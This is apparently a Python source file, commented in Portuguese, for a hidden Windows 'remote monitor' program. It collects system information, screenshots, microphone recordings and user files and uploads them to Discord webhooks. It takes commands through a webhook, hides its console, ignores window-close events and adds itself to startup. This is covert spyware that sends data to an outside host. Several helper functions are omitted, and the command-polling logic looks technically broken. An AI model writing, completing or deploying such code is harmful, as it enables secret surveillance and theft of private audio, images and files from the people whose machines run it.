import sys
import os
import tempfile
import requests
import socket
import time
import psutil
import GPUtil
import cv2
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
from PIL import ImageGrab
import shutil
import zipfile
from datetime import datetime, timedelta
import winreg
import subprocess
import sqlite3
import threading
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QLabel, QVBoxLayout, QWidget,
    QSystemTrayIcon, QMenu
)
from PyQt6.QtGui import QIcon, QAction
from PyQt6.QtCore import Qt, QThread, pyqtSignal

# Configuração dos Webhooks
DISCORD_WEBHOOK_URL = 'SEU_WEBHOOK_PRINCIPAL'
DISCORD_WEBHOOK_AUDIO = 'SEU_WEBHOOK_AUDIO'
DISCORD_WEBHOOK_FILES = 'SEU_WEBHOOK_ARQUIVOS'
DISCORD_WEBHOOK_COMMANDS = 'SEU_WEBHOOK_COMANDOS'  # Novo webhook para comandos

# Variáveis globais de controle
MONITORING_ACTIVE = True
LAST_COMMAND_CHECK = 0
START_TIME = time.time()

def send_to_discord(webhook_url, message, file_path=None):
    """Envia mensagem para o Discord com opção de anexar arquivo."""
    try:
        data = {"content": message}
        files = None
        
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                response = requests.post(webhook_url, files=files, data=data)
        else:
            response = requests.post(webhook_url, json=data)
            
        return response.status_code == 200
            
    except Exception as e:
        print(f"Erro no envio para Discord: {e}")
        return False

def get_system_info():
    """Coleta informações detalhadas do sistema."""
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "Não disponível"
        
        uptime = str(timedelta(seconds=time.time() - START_TIME))
        monitoring_time = str(timedelta(seconds=time.time() - psutil.boot_time()))
        
        return (
            "**Informações do Sistema:**\n"
            f"- Hostname: {hostname}\n"
            f"- IP: {ip_address}\n"
            f"- Tempo de monitoramento: {uptime}\n"
            f"- Tempo de atividade do sistema: {monitoring_time}\n"
            f"- CPU: {os.cpu_count()} núcleos\n"
            f"- Memória Total: {round(psutil.virtual_memory().total / (1024**3), 1)} GB"
        )
    except Exception as e:
        return f"Erro ao obter informações: {str(e)}"

def get_system_usage():
    """Obtém métricas de uso do sistema."""
    try:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return (
            "**Uso do Sistema:**\n"
            f"- CPU: {cpu}%\n"
            f"- Memória: {mem.percent}% ({round(mem.used/1024**3, 1)}/{round(mem.total/1024**3, 1)} GB)\n"
            f"- Disco: {disk.percent}% ({round(disk.used/1024**3, 1)}/{round(disk.total/1024**3, 1)} GB)"
        )
    except Exception as e:
        return f"Erro ao obter uso do sistema: {str(e)}"

def check_commands():
    """Verifica por comandos no Discord."""
    global MONITORING_ACTIVE, LAST_COMMAND_CHECK
    
    try:
        # Verificar mensagens no webhook de comandos
        response = requests.get(DISCORD_WEBHOOK_COMMANDS + "/messages?limit=1")
        if response.status_code == 200:
            messages = response.json()
            if messages:
                last_message = messages[0]['content'].strip().lower()
                
                if "!stop" in last_message and MONITORING_ACTIVE:
                    MONITORING_ACTIVE = False
                    send_to_discord(DISCORD_WEBHOOK_COMMANDS, "Monitoramento pausado")
                    
                elif "!start" in last_message and not MONITORING_ACTIVE:
                    MONITORING_ACTIVE = True
                    send_to_discord(DISCORD_WEBHOOK_COMMANDS, "Monitoramento retomado")
                    
                elif "!status" in last_message:
                    status = "ATIVO" if MONITORING_ACTIVE else "PAUSADO"
                    uptime = str(timedelta(seconds=time.time() - START_TIME))
                    send_to_discord(DISCORD_WEBHOOK_COMMANDS, 
                                  f"Status: {status}\nTempo de monitoramento: {uptime}")
                
                LAST_COMMAND_CHECK = time.time()
                
    except Exception as e:
        print(f"Erro ao verificar comandos: {str(e)}")

def monitor_system():
    """Função principal de monitoramento."""
    while True:
        try:
            # Verificar comandos a cada 30 segundos
            if time.time() - LAST_COMMAND_CHECK > 30:
                check_commands()
            
            if not MONITORING_ACTIVE:
                time.sleep(10)
                continue
                
            # Coletar e enviar informações básicas
            info = get_system_info()
            send_to_discord(DISCORD_WEBHOOK_URL, info)
            
            # Coletar e enviar uso do sistema
            usage = get_system_usage()
            send_to_discord(DISCORD_WEBHOOK_URL, usage)
            
            # Screenshot a cada 30 minutos
            if int(time.time()) % 1800 < 120:  # Janela de 2 minutos
                screen = capture_screenshot()
                if screen:
                    send_to_discord(DISCORD_WEBHOOK_URL, "Screenshot:", screen)
                    os.remove(screen)
            
            # Áudio a cada 1 hora
            if int(time.time()) % 3600 < 120:
                audio = record_audio(30)  # 30 segundos
                if audio:
                    send_to_discord(DISCORD_WEBHOOK_AUDIO, "Áudio:", audio)
                    os.remove(audio)
            
            # Arquivos uma vez por dia
            if int(time.time()) % 86400 < 120:
                files = collect_files()
                if files:
                    send_to_discord(DISCORD_WEBHOOK_FILES, "Arquivos:", files)
                    os.remove(files)
            
            time.sleep(120)  # Intervalo de 2 minutos
            
        except Exception as e:
            print(f"Erro no monitoramento: {str(e)}")
            time.sleep(60)

# [As funções auxiliares restantes (capture_screenshot, record_audio, collect_files, etc.) 
# permanecem as mesmas da versão anterior...]

class SystemTrayApp(QMainWindow):
    """Aplicativo de bandeja do sistema com controle remoto."""
    def __init__(self):
        super().__init__()
        
        self.setWindowTitle("Monitor Remoto")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setFixedSize(1, 1)
        
        # Configurar bandeja
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(QIcon("icon.ico"))
        
        # Menu da bandeja
        menu = QMenu()
        
        self.status_action = menu.addAction("Status: Ativo")
        menu.addSeparator()
        
        exit_action = menu.addAction("Sair")
        exit_action.triggered.connect(self.quit_app)
        
        self.tray_icon.setContextMenu(menu)
        self.tray_icon.show()
        
        # Iniciar thread de monitoramento
        self.monitor_thread = threading.Thread(target=monitor_system, daemon=True)
        self.monitor_thread.start()
        
        # Adicionar à inicialização
        add_to_startup()
    
    def update_status(self, message):
        """Atualiza o status na bandeja."""
        self.status_action.setText(f"Status: {message}")
    
    def quit_app(self):
        """Encerra o aplicativo."""
        global MONITORING_ACTIVE
        MONITORING_ACTIVE = False
        self.tray_icon.hide()
        QApplication.quit()
    
    def closeEvent(self, event):
        event.ignore()

def main():
    # Configuração inicial
    if sys.platform == 'win32':
        try:
            import win32event
            mutex = win32event.CreateMutex(None, False, "Global\\RemoteMonitor")
            if not mutex:
                sys.exit(0)
            
            # Ocultar console
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    
    tray_app = SystemTrayApp()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()